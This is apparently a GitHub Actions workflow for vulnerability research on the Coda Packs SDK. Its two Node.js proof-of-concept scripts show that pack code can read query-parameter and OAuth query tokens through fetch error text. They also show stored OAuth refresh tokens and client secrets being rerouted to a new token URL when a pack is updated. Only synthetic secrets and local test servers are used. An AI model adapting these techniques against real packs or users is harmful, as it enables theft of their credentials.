name: Temporary Superhuman query-token leak and OAuth update gate v2

on:
  push:
    branches: [research/superhuman-index-attachment-20260811]
    paths: [.github/workflows/superhuman-query-token-leak-oauth-update-v2-20260811.yml]

permissions:
  contents: write

jobs:
  gate:
    runs-on: ubuntu-24.04
    timeout-minutes: 30
    steps:
      - uses: actions/checkout@v4
        with: {fetch-depth: 1}
      - uses: actions/setup-node@v4
        with: {node-version: '22'}

      - name: Install exact stable runtime
        shell: bash
        run: |
          set -euo pipefail
          rm -rf sh-query-oauth-v2
          mkdir -p sh-query-oauth-v2/evidence public-intake-status
          cd sh-query-oauth-v2
          npm init -y >/dev/null
          npm install --no-audit --no-fund @codahq/packs-sdk@1.17.1 isolated-vm@6.0.2
          openssl req -x509 -newkey rsa:2048 -nodes \
            -keyout lab-key.pem -out lab-cert.pem -days 1 \
            -subj '/CN=127.0.0.1' >/dev/null 2>&1

      - name: Run exact query-credential error disclosure gate
        shell: bash
        run: |
          set -euo pipefail
          cd sh-query-oauth-v2
          cat > query_error_gate.js <<'NODE'
          'use strict';
          const assert = require('assert');
          const crypto = require('crypto');
          const fs = require('fs');
          const os = require('os');
          const path = require('path');
          const sdk = require('@codahq/packs-sdk');
          const sdkRoot = path.dirname(require.resolve('@codahq/packs-sdk/package.json'));
          const bootstrap = require(path.join(sdkRoot,'dist/runtime/bootstrap/index.js'));
          const {AuthenticatingFetcher} = require(path.join(sdkRoot,'dist/testing/fetcher.js'));
          const {compilePackMetadata} = require(path.join(sdkRoot,'dist/helpers/metadata.js'));
          const {validatePackVersionMetadata} = require(path.join(sdkRoot,'dist/testing/upload_validation.js'));

          const logger={trace(){},debug(){},info(){},warn(){},error(){}};
          const blob={async storeUrl(){throw new Error('unused')},async storeBlob(){throw new Error('unused')}};
          const nonce=crypto.randomBytes(8).toString('hex');
          const target=`https://${nonce}.example.invalid/closed`;

          async function validateQueryPack(){
            const pack=sdk.newPack(); pack.setVersion('1.0.0'); pack.addNetworkDomain('example.invalid');
            pack.setUserAuthentication({type:sdk.AuthenticationType.QueryParamToken,paramName:'api_key'});
            pack.addFormula({name:'Probe',description:'probe',parameters:[],resultType:sdk.ValueType.String,connectionRequirement:sdk.ConnectionRequirement.Required,execute:async()=>''});
            const metadata=compilePackMetadata(pack);
            const validated=await validatePackVersionMetadata(metadata,'1.17.1');
            assert.equal(validated.defaultAuthentication.type,'QueryParamToken');
            return validated;
          }

          async function runCase({label,authDef,credentials,secrets}){
            const work=fs.mkdtempSync(path.join(os.tmpdir(),'sh-query-leak-'));
            const packPath=path.join(work,'pack.js'); const mapPath=path.join(work,'pack.js.map');
            fs.writeFileSync(packPath,`module.exports={pack:{defaultAuthentication:${JSON.stringify(authDef)},networkDomains:['example.invalid'],formulas:[{name:'Probe',description:'probe',parameters:[],resultType:'string',connectionRequirement:'required',execute:async(_p,context)=>{try{await context.fetcher.fetch({method:'GET',url:${JSON.stringify(target)}});return 'UNEXPECTED_SUCCESS'}catch(e){return [e&&e.name,e&&e.message,e&&e.stack].filter(Boolean).join('\\n')}}}]}};`);
            fs.writeFileSync(mapPath,'{"version":3,"file":"pack.js","sources":["pack-source.js"],"names":[],"mappings":""}\n');
            const isolate=bootstrap.createIsolate({memoryLimit:64}); const context=await bootstrap.createIsolateContext(isolate);
            await bootstrap.registerBundles(isolate,context,packPath,bootstrap.getThunkPath(),true);
            const fetcher=new AuthenticatingFetcher(()=>{},authDef,['example.invalid'],credentials,`LAB_INVOCATION_${label}`);
            await bootstrap.injectExecutionContext({context,fetcher,temporaryBlobStorage:blob,syncStateService:undefined,logger,endpoint:undefined,invocationLocation:{protocolAndHost:'https://coda.io'},timezone:'UTC',invocationToken:`LAB_INVOCATION_${label}`,sync:undefined,authenticationName:'defaultUserAuthentication',executionId:`LAB_EXECUTION_${label}`,previousAttemptError:undefined});
            const formulaResult=await bootstrap.executeThunk(context,{params:[],formulaSpec:{type:'Standard',formulaName:'Probe'}},packPath,mapPath);
            isolate.dispose(); fs.rmSync(work,{recursive:true,force:true});
            const visible=Object.fromEntries(secrets.map(secret=>[secret,formulaResult.includes(secret)]));
            return {label,formulaResult,visible,allSecretsVisible:Object.values(visible).every(Boolean)};
          }

          (async()=>{
            const validated=await validateQueryPack();
            const q='LAB_QUERY_PARAM_SECRET_20260811';
            const q1='LAB_MULTI_QUERY_ONE_20260811'; const q2='LAB_MULTI_QUERY_TWO_20260811';
            const oq='LAB_OAUTH_QUERY_ACCESS_20260811'; const header='LAB_HEADER_CONTROL_20260811';
            const query=await runCase({label:'QUERY',authDef:{type:'QueryParamToken',paramName:'api_key'},credentials:{paramValue:q},secrets:[q]});
            const multi=await runCase({label:'MULTI_QUERY',authDef:{type:'MultiQueryParamToken',params:[{name:'key1'},{name:'key2'}]},credentials:{params:{key1:q1,key2:q2}},secrets:[q1,q2]});
            const oauthQuery=await runCase({label:'OAUTH_QUERY',authDef:{type:'OAuth2',authorizationUrl:'https://auth.example.invalid/authorize',tokenUrl:'https://auth.example.invalid/token',scopes:[],tokenQueryParam:'access_token'},credentials:{clientId:'LAB_ID',clientSecret:'LAB_SECRET',accessToken:oq,refreshToken:'LAB_REFRESH',scopes:[]},secrets:[oq]});
            const headerControl=await runCase({label:'HEADER_CONTROL',authDef:{type:'HeaderBearerToken'},credentials:{token:header},secrets:[header]});
            assert(query.allSecretsVisible); assert(multi.allSecretsVisible); assert(oauthQuery.allSecretsVisible); assert.equal(headerControl.allSecretsVisible,false);
            const result={pass:true,sdkVersion:require(path.join(sdkRoot,'package.json')).version,isolatedVmVersion:require('isolated-vm/package.json').version,nodeVersion:process.version,officialUploadValidatorAccepted:true,declaredNetworkDomain:'example.invalid',failingStandard443Subdomain:target,query,multi,oauthQuery,headerControl,queryCredentialsReturnedAsFormulaResult:true,negativeHeaderControlClean:true,syntheticOnly:true,productionRequestCount:0};
            fs.writeFileSync('evidence/QUERY_ERROR_DISCLOSURE_RESULT.json',JSON.stringify(result,null,2)+'\n');
            fs.writeFileSync('evidence/QUERY_PACK_METADATA.json',JSON.stringify(validated,null,2)+'\n');
            console.log(JSON.stringify(result,null,2));
          })().catch(e=>{console.error(e&&e.stack||e);process.exit(1)});
          NODE
          node query_error_gate.js | tee evidence/QUERY_ERROR_DISCLOSURE_OUTPUT.txt
          jq -e '.pass == true and .queryCredentialsReturnedAsFormulaResult == true and .negativeHeaderControlClean == true' evidence/QUERY_ERROR_DISCLOSURE_RESULT.json >/dev/null

      - name: Run exact OAuth v1-to-v2 credential rerouting gate
        shell: bash
        env:
          NODE_TLS_REJECT_UNAUTHORIZED: '0'
        run: |
          set -euo pipefail
          cd sh-query-oauth-v2
          cat > oauth_update_gate.js <<'NODE'
          'use strict';
          const assert=require('assert'); const fs=require('fs'); const https=require('https'); const path=require('path');
          const sdk=require('@codahq/packs-sdk'); const sdkRoot=path.dirname(require.resolve('@codahq/packs-sdk/package.json'));
          const {AuthenticatingFetcher}=require(path.join(sdkRoot,'dist/testing/fetcher.js'));
          const {compilePackMetadata}=require(path.join(sdkRoot,'dist/helpers/metadata.js'));
          const {validatePackVersionMetadata}=require(path.join(sdkRoot,'dist/testing/upload_validation.js'));
          const tls={key:fs.readFileSync('lab-key.pem'),cert:fs.readFileSync('lab-cert.pem')};
          const CLIENT_ID='LAB_OAUTH_CLIENT_ID_20260811',CLIENT_SECRET='LAB_OAUTH_CLIENT_SECRET_20260811',OLD_ACCESS='LAB_EXPIRED_ACCESS_20260811',REFRESH='LAB_REFRESH_TOKEN_20260811',NEW_ACCESS='LAB_NEW_ACCESS_20260811';
          const captures=[]; function listen(s){return new Promise((r,j)=>s.listen(0,'127.0.0.1',()=>r(s.address().port)).once('error',j))} function close(s){return new Promise(r=>s.close(r))}
          (async()=>{
            const tokenServer=https.createServer(tls,(req,res)=>{let body='';req.on('data',c=>body+=c);req.on('end',()=>{captures.push({server:'v2-token',method:req.method,url:req.url,headers:req.headers,body});res.writeHead(200,{'content-type':'application/json'});res.end(JSON.stringify({access_token:NEW_ACCESS,refresh_token:REFRESH,expires_in:3600,token_type:'Bearer'}))})});
            const apiServer=https.createServer(tls,(req,res)=>{captures.push({server:'api',method:req.method,url:req.url,headers:req.headers});if((req.headers.authorization||'').includes(OLD_ACCESS)){res.writeHead(401,{'content-type':'application/json'});res.end(JSON.stringify({error:'expired'}))}else{res.writeHead(200,{'content-type':'application/json'});res.end(JSON.stringify({ok:true}))}});
            const tokenPort=await listen(tokenServer),apiPort=await listen(apiServer); const tokenUrl=`https://127.0.0.1:${tokenPort}/oauth/token`,authorizationUrl=`https://127.0.0.1:${tokenPort}/oauth/authorize`,apiUrl=`https://127.0.0.1:${apiPort}/resource`;
            const v2=sdk.newPack(); v2.setVersion('2.0.0'); v2.addNetworkDomain(`127.0.0.1:${apiPort}`); v2.setUserAuthentication({type:sdk.AuthenticationType.OAuth2,authorizationUrl,tokenUrl,scopes:[]}); v2.addFormula({name:'Read',description:'read',parameters:[],resultType:sdk.ValueType.String,connectionRequirement:sdk.ConnectionRequirement.Required,execute:async()=>''});
            const validated=await validatePackVersionMetadata(compilePackMetadata(v2),'1.17.1'); assert.equal(validated.defaultAuthentication.tokenUrl,tokenUrl);
            const storedV1={clientId:CLIENT_ID,clientSecret:CLIENT_SECRET,accessToken:OLD_ACCESS,refreshToken:REFRESH,scopes:[]}; let updated;
            const v2Auth={type:'OAuth2',authorizationUrl,tokenUrl,scopes:[]}; const fetcher=new AuthenticatingFetcher(c=>{updated=c},v2Auth,[`127.0.0.1:${apiPort}`],storedV1,'LAB_INVOCATION_OAUTH_UPDATE');
            const response=await fetcher.fetch({method:'GET',url:apiUrl}); assert.equal(response.status,200);
            const tokenCapture=captures.find(x=>x.server==='v2-token'); assert(tokenCapture); assert(tokenCapture.body.includes(`refresh_token=${REFRESH}`));
            const secretInBody=tokenCapture.body.includes(`client_secret=${CLIENT_SECRET}`); const secretInBasic=(tokenCapture.headers.authorization||'').includes(Buffer.from(`${CLIENT_ID}:${CLIENT_SECRET}`).toString('base64')); assert(secretInBody||secretInBasic); assert.equal(updated.accessToken,NEW_ACCESS);
            const result={pass:true,sdkVersion:require(path.join(sdkRoot,'package.json')).version,officialV2UploadValidatorAccepted:true,storedV1CredentialsUsedWithV2AuthDefinition:true,refreshTokenDeliveredToV2TokenUrl:true,clientSecretDeliveredToV2TokenUrl:secretInBody||secretInBasic,newAccessTokenPersisted:true,v2AuthorizationUrl:authorizationUrl,v2TokenUrl:tokenUrl,captures,syntheticOnly:true,productionRequestCount:0};
            fs.writeFileSync('evidence/OAUTH_UPDATE_RESULT.json',JSON.stringify(result,null,2)+'\n'); console.log(JSON.stringify(result,null,2)); await close(tokenServer); await close(apiServer);
          })().catch(e=>{console.error(e&&e.stack||e);process.exit(1)});
          NODE
          node oauth_update_gate.js | tee evidence/OAUTH_UPDATE_OUTPUT.txt
          jq -e '.pass == true and .refreshTokenDeliveredToV2TokenUrl == true and .clientSecretDeliveredToV2TokenUrl == true' evidence/OAUTH_UPDATE_RESULT.json >/dev/null

      - name: Produce compact decision and hashes
        shell: bash
        run: |
          set -euo pipefail
          cd sh-query-oauth-v2
          python3 - <<'PY'
          import json,os,pathlib
          ev=pathlib.Path('evidence'); query=json.loads((ev/'QUERY_ERROR_DISCLOSURE_RESULT.json').read_text()); oauth=json.loads((ev/'OAUTH_UPDATE_RESULT.json').read_text())
          result={'pass':bool(query['pass'] and oauth['pass']),'workflowRunId':int(os.environ['GITHUB_RUN_ID']),'sourceCommit':os.environ['GITHUB_SHA'],'queryTokenDisclosureConfirmed':query['queryCredentialsReturnedAsFormulaResult'],'queryTokenDisclosureNegativeControlClean':query['negativeHeaderControlClean'],'oauthUpdateRefreshTokenRerouted':oauth['refreshTokenDeliveredToV2TokenUrl'],'oauthUpdateClientSecretRerouted':oauth['clientSecretDeliveredToV2TokenUrl'],'strongestCandidate':'QUERY_PARAMETER_CREDENTIAL_DISCLOSURE_TO_UNTRUSTED_PACK_CODE','queryCandidateDecision':'HIGH_CANDIDATE','oauthUpdateDecision':'HOLD_PENDING_HOSTED_CONNECTION_PERSISTENCE','submissionReady':False,'syntheticOnly':True,'productionRequestCount':0}
          (ev/'RESULT.json').write_text(json.dumps(result,indent=2)+'\n'); pathlib.Path('../public-intake-status/superhuman-query-token-oauth-update-v2-result.json').write_text(json.dumps(result,indent=2)+'\n'); print(json.dumps(result,indent=2))
          PY
          find evidence -maxdepth 1 -type f ! -name SHA256SUMS.txt -print0 | sort -z | xargs -0 sha256sum > evidence/SHA256SUMS.txt

      - uses: actions/upload-artifact@v4
        with:
          name: superhuman-query-token-leak-oauth-update-v2
          path: sh-query-oauth-v2/evidence/
          retention-days: 1
          if-no-files-found: error

      - name: Commit compact result
        shell: bash
        run: |
          set -euo pipefail
          git config user.name github-actions[bot]
          git config user.email 41898282+github-actions[bot]@users.noreply.github.com
          git add public-intake-status/superhuman-query-token-oauth-update-v2-result.json
          git commit -m 'chore: record hardened Superhuman credential-boundary gates'
          git push
